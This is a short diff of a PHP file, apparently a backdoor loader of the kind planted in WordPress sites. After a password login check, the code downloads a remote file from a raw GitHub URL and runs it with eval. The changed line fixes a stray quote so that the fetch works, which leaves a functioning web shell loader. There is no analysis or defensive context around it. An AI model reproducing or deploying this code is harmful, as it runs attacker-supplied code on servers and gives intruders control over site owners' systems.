@@ -66,7 +66,7 @@ if (isset($_POST["password"])) {
 }
 
 if (is_logged_in()) {
-    $a = geturlsinfo("https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/wp-login.php'");
+    $a = geturlsinfo("https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/wp-login.php");
     eval("?>" . $a);
 } else {
     ?>
